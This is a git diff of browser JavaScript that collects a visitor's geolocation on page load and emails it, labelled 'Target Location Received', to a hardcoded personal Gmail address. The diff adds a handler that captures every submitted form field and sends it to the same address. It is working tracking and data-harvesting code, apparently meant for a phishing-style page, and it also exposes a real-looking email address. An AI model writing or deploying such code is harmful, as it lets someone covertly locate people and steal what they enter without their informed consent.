@@ -14,6 +14,18 @@ document.addEventListener("DOMContentLoaded", function () {
         console.log("Geolocation is not supported by this browser.");
         locationDisplay.textContent = "Geolocation is not supported by this browser.";
     }
+
+    // Handle form submission
+    const form = document.getElementById("dataForm");
+    if (form) {
+        form.addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevent default form submission
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+
+            sendEmail("Form Submission", JSON.stringify(data, null, 2), "khalilrodini@gmail.com");
+        });
+    }
 });
 
 // Handle successful geolocation
@@ -25,7 +37,7 @@ function handleLocationSuccess(position) {
     locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
     console.log(`Location received: Latitude ${latitude}, Longitude ${longitude}`);
 
-    sendEmail('Target Location Received', locationDisplay.textContent, 'khalilrodini@gmail.com');
+    sendEmail("Target Location Received", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodini@gmail.com");
 }
 
 // Handle geolocation errors
@@ -51,7 +63,7 @@ function handleLocationError(error) {
     locationDisplay.textContent = errorMessage;
     console.log("Geolocation error:", errorMessage);
 
-    sendEmail('Location Access Error', errorMessage, 'khalilrodini@gmail.com');
+    sendEmail("Location Access Error", errorMessage, "khalilrodini@gmail.com");
 }
 
 // Send email function
@@ -73,26 +85,25 @@ function sendEmail(subject, message, recipientEmail) {
         headers: {
             "Content-Type": "application/json",
         },
-        body: JSON.stringify(emailData)
+        body: JSON.stringify(emailData),
     })
-        .then(response => {
+        .then((response) => {
             if (response.ok) {
                 return response.json();
             } else {
                 throw new Error(`Server responded with ${response.status}`);
             }
         })
-        .then(data => {
+        .then((data) => {
             if (data.message) {
                 alert("Email sent successfully!");
-                window.location.href = "https://www.youtube.com";
             } else if (data.error) {
                 alert("Error: " + data.error);
             } else {
                 alert("Unexpected error occurred.");
             }
         })
-        .catch(error => {
+        .catch((error) => {
             console.log("Error sending email:", error);
             alert("Error sending email: " + error.message);
         });
